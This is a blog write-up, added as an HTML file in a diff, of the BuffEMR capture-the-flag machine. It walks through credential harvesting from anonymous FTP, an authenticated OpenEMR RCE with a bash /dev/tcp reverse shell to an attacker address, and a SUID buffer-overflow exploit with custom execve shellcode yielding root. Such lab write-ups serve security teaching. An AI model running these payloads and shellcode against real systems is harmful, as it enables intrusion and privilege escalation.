@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin SEO tag -->
+<title>BuffEMR | 0bfxgh0st*</title>
+<meta name="generator" content="0bfxgh0st" />
+<meta property="og:title" content="BuffEMR" />
+<meta name="author" content="0bfxgh0st" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="BuffEMR WriteUp" />
+<meta property="og:description" content="BuffEMR WriteUp" />
+<link rel="icon" href="/assets/favicon.ico" />
+<link rel="canonical" href="#" />
+<meta property="og:url" content="#" />
+<meta property="og:site_name" content="0bfxgh0st*" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-02-25T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="BuffEMR" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0bfxgh0st"},"dateModified":"2020-02-25T00:00:00-05:00","datePublished":"2020-02-25T00:00:00-05:00","description":"BuffEMR WriteUp","headline":"Welcome To 0bfxgh0st Blog","mainEntityOfPage":{"@type":"WebPage","@id":"#"},"url":"#"}</script>
+<!-- End SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="#" title="0bfxgh0st*" /></head><body><header class="site-header"><nav class="site-nav">
+      
+      <div class="trigger">
+            <a class="page-link" href="../">
+              [R]eturn
+            </a></div>
+    </nav><div class="site-icon">
+    <img src="/assets/default-icon.png" />
+  </div>
+
+</header>
+<main class="page-content" aria-label="Content">
+        <div class="wrapper">
+            <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">BuffEMR</h1>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Port recognition with<code class="language-plaintext highlighter-rouge">nmap</code></p>
+
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">nmap</span> --min-rate 5000 -sV buffemr.vuln --script=ftp-anon
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 10:55 EST
+Nmap scan report for buffemr.vuln (10.0.2.81)
+Host is up (0.000070s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    3 0        0            4096 Jun 21  2021 share
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+MAC Address: 08:00:27:93:6F:1A (Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds
+</code></pre></figure>
+<p>nmap reports three open ports 21 for ftp with anonymous login, 22 for ssh and 80 for the webserver</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">wget </span>-r ftp://ftp:ftp@buffemr.vuln
+buffemr.vuln
+</code></pre></figure>
+
+<p>We can donwload the whole ftp server content recursively with wget</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">cat </span>buffemr.vuln/share/openemr/sites/default/sqlconf.php 
+&lt?php
+//  OpenEMR
+//  MySQL Config
+
+$host   = 'localhost';
+$port   = '3306';
+$login  = 'openemruser';
+$pass   = 'openemruser123456';
+$dbase  = 'openemr';
+
+//Added ability to disable
+//utf8 encoding - bm 05-2009
+global $disable_utf8_flag;
+$disable_utf8_flag = false;
+
+$sqlconf = array();
+global $sqlconf;
+$sqlconf["host"]= $host;
+$sqlconf["port"] = $port;
+$sqlconf["login"] = $login;
+$sqlconf["pass"] = $pass;
+$sqlconf["dbase"] = $dbase;
+//////////////////////////
+//////////////////////////
+//////////////////////////
+//////DO NOT TOUCH THIS///
+$config = 1; /////////////
+//////////////////////////
+//////////////////////////
+//////////////////////////
+?&gt
+</code></pre></figure>
+
+<p>We found credentials for an internal database</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">cat </span>buffemr.vuln/share/openemr/tests/test.accounts
+this is a test admin account:
+
+admin:Monster123
+</code></pre></figure>
+
+<p>More credentials found</p>
+
+<p>Visit http://buffemr.vuln/openemr/ and you will be redirected to http://buffemr.vuln/openemr/interface/login/login.php?site=default where you can log as admin:Monster123. Once logged go to about tab and you will see Version Number: v5.0.1</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">searchsploit </span>openemr 5.0.1               
+----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                   |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenEMR 5.0.1 - 'controller' Remote Code Execution                                                                                                               | php/webapps/48623.txt
+OpenEMR 5.0.1 - Remote Code Execution (1)                                                                                                                        | php/webapps/48515.py
+OpenEMR 5.0.1 - Remote Code Execution (Authenticated) (2)                                                                                                        | php/webapps/49486.rb
+OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                                                                                      | php/webapps/49998.py
+OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)                                                                                  | php/webapps/50122.rb
+OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                                                                                         | linux/webapps/45202.txt
+OpenEMR 5.0.1.3 - Authentication Bypass                                                                                                                          | php/webapps/50017.py
+OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                                                                                          | php/webapps/45161.py
+OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)                                                                                                      | php/webapps/50037.py
+OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated) (2)                                                                                                  | php/webapps/50087.rb
+----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</code></pre></figure>
+
+<p>We are gonna use OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated) php/webapps/45161.py</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">python2 </span>45161.py http://emr.vuln/openemr -u admin -p Monster123 -c 'bash -i >& /dev/tcp/10.0.2.15/1337 0>&1'
+ .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
+/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
+| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
+| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
+\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
+ )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
+(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
+                                                       
+   ={   P R O J E C T    I N S E C U R I T Y   }=    
+                                                       
+         Twitter : @Insecurity                       
+         Site    : insecurity.sh                     
+
+[$] Authenticating with admin:Monster123
+[$] Injecting payload
+</code></pre></figure>
+
+<p>With our netcat set first as listener we exploit this with the given credentials and a reverse shell as injectable command</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">nc </span>-lvp 1337
+listening on [any] 1337 ...
+connect to [10.0.2.15] from buffemr.vuln [10.0.2.81] 46732
+bash: cannot set terminal process group (27570): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@buffemr:/var/www/html/openemr/interface/main$
+</code></pre></figure>
+
+<p>And we are connected</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">www-data@buffemr:/var/www/html/openemr/interface/main$ mysql -u openemruser -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 80
+Server version: 5.7.41-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| openemr            |
+| user_info          |
++--------------------+
+</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">mysql> select * from user_info.ENCKEYS;
++------+--------+----------------------+
+| id   | name   | ENC                  |
++------+--------+----------------------+
+|    1 | pdfkey | c2FuM25jcnlwdDNkCg== |
++------+--------+----------------------+
+</code></pre></figure>
+
+<p>We have more credentials</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">www-data@buffemr:/var/www/html/openemr/interface/main$ cd /var
+www-data@buffemr:/var$ ls 
+backups  cache  crash  lib  local  lock  log  mail  metrics  opt  run  snap  spool  tmp  user.zip  www
+www-data@buffemr:/var$ cp -r user.zip tmp
+www-data@buffemr:/var$ cd tmp
+www-data@buffemr:/var/tmp$ unzip user.zip
+Archive:  user.zip
+[user.zip] user.lst password: 
+  inflating: user.lst                
+www-data@buffemr:/var/tmp$ cat user.lst
+This file contain senstive information, therefore, should be always encrypted at rest.
+
+buffemr - Iamgr00t
+
+****** Only I can SSH in ************
+</code></pre></figure>
+
+<p>Unzip user.zip in writable path /var/tmp and we will get buffemr credentials</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">ssh </span>buffemr@buffemr.vuln                                     
+buffemr@buffemr.vuln's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+94 packages can be updated.
+1 update is a security update.
+
+New release '20.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Your Hardware Enablement Stack (HWE) is supported until April 2023.
+*** System restart required ***
+Last login: Thu Jun 24 10:01:00 2021 from 10.0.0.154
+buffemr@buffemr:~$ cat user_flag.txt
+    .-.    ))    wWw \\\  ///      wWw \\\    ///()_()                                                                 
+  c(O_O)c (o0)-. (O)_((O)(O))      (O)_((O)  (O))(O o)                                                                 
+ ,'.---.`, | (_))/ __)| \ ||       / __)| \  / |  |^_\                                                                 
+/ /|_|_|\ \| .-'/ (   ||\\||      / (   ||\\//||  |(_))                                                                
+| \_____/ ||(  (  _)  || \ |     (  _)  || \/ ||  |  /                                                                 
+'. `---' .` \)  \ \_  ||  ||      \ \_  ||    ||  )|\\                                                                 
+  `-...-'   (    \__)(_/  \_)      \__)(_/    \_)(/  \)                                                                
+ wWw  wWw  oo_     wWw ()_()        c  c     .-.   \\\    /// ))   ()_()     .-.   \\\    ///wW  Ww oo_     wWw  _     
+ (O)  (O) /  _)-<  (O)_(O o)        (OO)   c(O_O)c ((O)  (O))(o0)-.(O o)   c(O_O)c ((O)  (O))(O)(O)/  _)-<  (O)_/||_   
+ / )  ( \ \__ `.   / __)|^_\      ,'.--.) ,'.---.`, | \  / |  | (_))|^_\  ,'.---.`, | \  / |  (..) \__ `.   / __)/o_)  
+/ /    \ \   `. | / (   |(_))    / //_|_\/ /|_|_|\ \||\\//||  | .-' |(_))/ /|_|_|\ \||\\//||   ||     `. | / (  / |(\  
+| \____/ |   _| |(  _)  |  /     | \___  | \_____/ ||| \/ ||  |(    |  / | \_____/ ||| \/ ||  _||_    _| |(  _) | | )) 
+'. `--' .`,-'   | \ \_  )|\\     '.    ) '. `---' .`||    ||   \)   )|\\ '. `---' .`||    || (_/\_),-'   | \ \_ | |//  
+  `-..-' (_..--'   \__)(/  \)      `-.'    `-...-' (_/    \_)  (   (/  \)  `-...-' (_/    \_)     (_..--'   \__)\__/   
+
+
+
+COnGRATS !! lETs get ROOT now ....!!
+</code></pre></figure>
+
+<p>Logged through ssh, here is the user flag</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">buffemr@buffemr:~$ find / -perm /4000 2>/dev/null
+...
+/opt/dontexecute
+...
+</code></pre></figure>
+
+<p>We found what seems a file to scalate</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">buffemr@buffemr:~$ ls -la /opt/dontexecute
+-rwsrwxr-x 1 root root 7700 Jun 23  2021 /opt/dontexecute
+</code></pre></figure>
+
+<p>That file has bit suid and is executed as root</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">buffemr@buffemr:/opt$ file dontexecute
+dontexecute: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3c8287c844acebae4ece08e8c7eefc341e8972e4, not stripped
+</code></pre></figure>
+
+<p>File is an elf 32 bit executable</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">buffemr@buffemr:/opt$ checksec --file=dontexecute
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   77 Symbols        No    0               1               dontexecute
+</code></pre></figure>
+
+<p>ASLR and Stack Canary protections are disabled</p>
+
+<p>After analyzing binary with radare (or other reversing tool) we locate an strcpy function</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">buffemr@buffemr:/opt$ ./dontexecute
+Usage: ./dontexecute argument
+buffemr@buffemr:/opt$ ./dontexecute $(python2 -c "print('A'*550)")
+Segmentation fault (core dumped)
+</code></pre></figure>
+
+<p>Segmentation fault</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">buffemr@buffemr:/opt$ gdb -q ./dontexecute
+Reading symbols from ./dontexecute...(no debugging symbols found)...done.
+(gdb) run $(python2 -c "print('A'*550)")
+Starting program: /opt/dontexecute $(python2 -c "print('A'*550)")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) i r
+eax            0xffffd13c       -11972
+ecx            0xffffd780       -10368
+edx            0xffffd35c       -11428
+ebx            0x41414141       1094795585
+esp            0xffffd340       0xffffd340
+ebp            0x41414141       0x41414141
+esi            0xf7e31000       -136114176
+edi            0x0      0
+eip            0x41414141       0x41414141
+eflags         0x10286  [ PF SF IF RF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+</code></pre></figure>
+
+<p>As we can see this binary is vulnerable to stack based buffer overflow, now we should find the offset</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">(gdb) run $(python2 -c "print('A'*512 + 'B'*4)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /opt/dontexecute $(python2 -c "print('A'*512 + 'B'*4)")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) i r
+eax            0xffffd16c       -11924
+ecx            0xffffd780       -10368
+edx            0xffffd36a       -11414
+ebx            0x41414141       1094795585
+esp            0xffffd370       0xffffd370
+ebp            0x41414141       0x41414141
+esi            0xf7e31000       -136114176
+edi            0x0      0
+eip            0x42424242       0x42424242
+eflags         0x10286  [ PF SF IF RF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99 
+</code></pre></figure>
+
+<p>We have control of the eip register</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">; execve x86 /bin/bash -p - 41 bytes   by 0bfxgh0st*    dedicated to GatoGamer1155 m30ws
+;
+; nasm -f elf execve_x86_bash-p.asm
+; ld -o execve_x86_bash-p execve_x86_bash-p.o -m elf_i386
+; objdump -d execve_x86_bash-p |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+section .text
+
+global _start
+
+_start:
+
+xor eax,eax
+xor ecx,ecx
+xor edx,edx
+
+push eax
+push 0x68736162 
+push 0x2f6e6962 
+push 0x2f2f2f2f 
+mov ebx,esp
+
+push eax
+push 0x7070702d
+mov esi,esp
+
+push eax
+push esi
+push ebx
+mov ecx,esp
+
+mov al,11
+int 0x80
+</code></pre></figure>
+
+<p>Taking adventage of the bit suid in the binary file we selected a 41 bytes shellcode that executes /bin/bash -p, you can find my shellcodes at <a href="https://github.com/0bfxgh0st/ASM" target="_blank">ASM</a></p>
+
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">buffemr@buffemr:/opt$ echo $((512-41))                                                                                                                                                                      
+471
+</code></pre></figure>
+
+<p>We substract offset and shellcode length</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">(gdb) run $(python2 -c "print('\x90'*471 + '\x31\xc0\x31\xc9\x31\xd2\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x68\x2d\x70\x70\x70\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80' + 'B'*4)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /opt/dontexecute $(python2 -c "print('\x90'*471 + '\x31\xc0\x31\xc9\x31\xd2\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x68\x2d\x70\x70\x70\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80' + 'B'*4)")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/300wx $esp
+0xffffd370:     0xffffd500      0xffffd434      0xffffd440      0x565556e2
+0xffffd380:     0xffffd3a0      0x00000000      0x00000000      0xf7c74fa1
+0xffffd390:     0xf7e31000      0xf7e31000      0x00000000      0xf7c74fa1
+0xffffd3a0:     0x00000002      0xffffd434      0xffffd440      0xffffd3c4
+0xffffd3b0:     0x00000002      0xffffd434      0xf7e31000      0xf7fe570a
+0xffffd3c0:     0xffffd430      0x00000000      0xf7e31000      0x00000000
+0xffffd3d0:     0x00000000      0x59391ffa      0x280099ea      0x00000000
+0xffffd3e0:     0x00000000      0x00000000      0x00000040      0xf7ffd024
+0xffffd3f0:     0x00000000      0x00000000      0xf7fe5819      0x56556fc4
+0xffffd400:     0x00000002      0x56555560      0x00000000      0x56555591
+0xffffd410:     0x565556ce      0x00000002      0xffffd434      0x565557c0
+0xffffd420:     0x56555820      0xf7fe5960      0xffffd42c      0xf7ffd940
+0xffffd430:     0x00000002      0xffffd571      0xffffd582      0x00000000
+0xffffd440:     0xffffd787      0xffffdd73      0xffffdd9f      0xffffddc1
+0xffffd450:     0xffffddd0      0xffffdde1      0xffffddf6      0xffffde07
+0xffffd460:     0xffffde14      0xffffde1d      0xffffde26      0xffffde39
+0xffffd470:     0xffffde57      0xffffde98      0xffffdeab      0xffffdeb7
+0xffffd480:     0xffffdece      0xffffdede      0xffffdef2      0xffffdefa
+0xffffd490:     0xffffdf0a      0xffffdf40      0xffffdf5f      0xffffdfc7
+0xffffd4a0:     0x00000000      0x00000020      0xf7fd5b50      0x00000021
+0xffffd4b0:     0xf7fd5000      0x00000010      0x178bfbff      0x00000006
+0xffffd4c0:     0x00001000      0x00000011      0x00000064      0x00000003
+0xffffd4d0:     0x56555034      0x00000004      0x00000020      0x00000005
+0xffffd4e0:     0x00000009      0x00000007      0xf7fd6000      0x00000008
+0xffffd4f0:     0x00000000      0x00000009      0x56555560      0x0000000b
+0xffffd500:     0x000003e8      0x0000000c      0x000003e8      0x0000000d
+0xffffd510:     0x000003e8      0x0000000e      0x000003e8      0x00000017
+0xffffd520:     0x00000001      0x00000019      0xffffd55b      0x0000001a
+0xffffd530:     0x00000000      0x0000001f      0xffffdfe7      0x0000000f
+0xffffd540:     0xffffd56b      0x00000000      0x00000000      0x00000000
+0xffffd550:     0x00000000      0x00000000      0xa1000000      0x2f2554ac
+0xffffd560:     0x3302d34f      0x90b49840      0x6959c46e      0x00363836
+0xffffd570:     0x706f2f00      0x6f642f74      0x7865746e      0x74756365
+0xffffd580:     0x90900065      0x90909090      0x90909090      0x90909090
+0xffffd590:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd5a0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd5b0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd5c0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd5d0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd5e0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd5f0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd600:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd610:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd620:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd630:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd640:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd650:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd660:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd670:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd680:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd690:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd6a0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd6b0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd6c0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd6d0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd6e0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd6f0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd700:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd710:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd720:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd730:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd740:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd750:     0x90909090      0x90909090      0x31c03190      0x50d231c9
+0xffffd760:     0x73616268      0x69626868      0x2f682f6e      0x892f2f2f
+0xffffd770:     0x2d6850e3      0x89707070      0x535650e6      0x0bb0e189
+0xffffd780:     0x424280cd      0x4c004242      0x4f435f53      0x53524f4c
+0xffffd790:     0x3d73723d      0x69643a30      0x3b31303d      0x6c3a3433
+0xffffd7a0:     0x31303d6e      0x3a36333b      0x303d686d      0x69703a30
+0xffffd7b0:     0x3b30343d      0x733a3333      0x31303d6f      0x3a35333b
+0xffffd7c0:     0x303d6f64      0x35333b31      0x3d64623a      0x333b3034
+0xffffd7d0:     0x31303b33      0x3d64633a      0x333b3034      0x31303b33
+0xffffd7e0:     0x3d726f3a      0x333b3034      0x31303b31      0x3d696d3a
+0xffffd7f0:     0x733a3030      0x37333d75      0x3a31343b      0x333d6773
+0xffffd800:     0x33343b30      0x3d61633a      0x343b3033      0x77743a31
+0xffffd810:     0x3b30333d      0x6f3a3234      0x34333d77      0x3a32343b
+</code></pre></figure>
+
+<p>Finding where our nops are, where our shellcode starts to take a memory address to replace the four B's with a valid memory address, in this case is \x50\xd7\xff\xff</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">(gdb) run $(python2 -c "print('\x90'*471 + '\x31\xc0\x31\xc9\x31\xd2\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x68\x2d\x70\x70\x70\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x50\xd7\xff\xff')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /opt/dontexecute $(python2 -c "print('\x90'*471 + '\x31\xc0\x31\xc9\x31\xd2\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x68\x2d\x70\x70\x70\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x50\xd7\xff\xff')")
+process 28317 is executing new program: /bin/bash
+buffemr@buffemr:/opt$ exit
+exit
+[Inferior 1 (process 28317) exited normally]
+(gdb) quit
+</code></pre></figure>
+
+<p>Our exploit is working but we need to execute it out of gdb context</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">buffemr@buffemr:/opt$ cat exploit.py
+print('\x90'*471 + '\x31\xc0\x31\xc9\x31\xd2\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x68\x2d\x70\x70\x70\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x50\xd7\xff\xff')
+</code></pre></figure>
+
+<p>Here is the exploit</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">buffemr@buffemr:/opt$ ./dontexecute $(python2 exploit.py)
+bash-4.4# cat /root/Root_flag.txt
+                                                                                                                                          
+                                                                                                                                            
+________                __  __                       ____                                  _____                                        ___ 
+`MMMMMMMb.             69MM69MM                     6MMMMb                                69M`MM                                        `MM 
+ MM    `Mb            6M' 6M' `                    8P    Y8                              6M' `MM                                         MM 
+ MM     MM ___   ___ _MM__MM______  ___  __       6M      Mb ____    ___  ____  ___  __ _MM__ MM   _____  ____    _    ___  ____     ____MM 
+ MM    .M9 `MM    MM MMMMMMMM6MMMMb `MM 6MM       MM      MM `MM(    )M' 6MMMMb `MM 6MM MMMMM MM  6MMMMMb `MM(   ,M.   )M' 6MMMMb   6MMMMMM 
+ MMMMMMM(   MM    MM  MM  MM6M'  `Mb MM69 "       MM      MM  `Mb    d' 6M'  `Mb MM69 "  MM   MM 6M'   `Mb `Mb   dMb   d' 6M'  `Mb 6M'  `MM 
+ MM    `Mb  MM    MM  MM  MMMM    MM MM'          MM      MM   YM.  ,P  MM    MM MM'     MM   MM MM     MM  YM. ,PYM. ,P  MM    MM MM    MM 
+ MM     MM  MM    MM  MM  MMMMMMMMMM MM           MM      MM    MM  M   MMMMMMMM MM      MM   MM MM     MM  `Mb d'`Mb d'  MMMMMMMM MM    MM 
+ MM     MM  MM    MM  MM  MMMM       MM           YM      M9    `Mbd'   MM       MM      MM   MM MM     MM   YM,P  YM,P   MM       MM    MM 
+ MM    .M9  YM.   MM  MM  MMYM    d9 MM            8b    d8      YMP    YM    d9 MM      MM   MM YM.   ,M9   `MM'  `MM'   YM    d9 YM.  ,MM 
+_MMMMMMM9'   YMMM9MM__MM__MM_YMMMM9 _MM_            YMMMM9        M      YMMMM9 _MM_    _MM_ _MM_ YMMMMM9     YP    YP     YMMMM9   YMMMMMM_
+                                                                                                                                            
+                                                                                                                                            
+                                                                                                                                            
+                                                                                                                                            
+                                                                                                                                            
+________                                           ___        8   8                                                                         
+`MMMMMMMb.                                         `MM       (M) (M)                                                                        
+ MM    `Mb                      /                   MM       (M) (M)                                                                        
+ MM     MM   _____     _____   /M      ____     ____MM       (M) (M)                                                                        
+ MM     MM  6MMMMMb   6MMMMMb /MMMMM  6MMMMb   6MMMMMM        M   M                                                                         
+ MM    .M9 6M'   `Mb 6M'   `Mb MM    6M'  `Mb 6M'  `MM        M   M                                                                         
+ MMMMMMM9' MM     MM MM     MM MM    MM    MM MM    MM        M   M                                                                         
+ MM  \M\   MM     MM MM     MM MM    MMMMMMMM MM    MM        8   8                                                                         
+ MM   \M\  MM     MM MM     MM MM    MM       MM    MM                                                                                      
+ MM    \M\ YM.   ,M9 YM.   ,M9 YM.  ,YM    d9 YM.  ,MM       68b 68b                                                                        
+_MM_    \M\_YMMMMM9   YMMMMM9   YMMM9 YMMMM9   YMMMMMM_      Y89 Y89  
+
+
+COngratulations !!! Tweet me at @san3ncrypt3d !
+</code></pre></figure>
+
+  </div>
+
+  <p class="post-meta"><time class="dt-published" datetime="2020-02-25T00:00:00-05:00" itemprop="datePublished">
+        Feb 27, 2023
+      </time>• 
+        <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <span class="p-author h-card" itemprop="name">0bfxgh0st</span></span></p>
+  
+
+  <a class="u-url" href="#" hidden></a>
+</article>
+
+  </div>
+        </div>
+    </main><footer class="site-footer h-card">
+    <data class="u-url" href="/"></data>
+
+    <div class="wrapper">
+
+        <div class="footer">
+
+        </div>
+    </div>
+
+</footer>
+</body>
+
+</html>
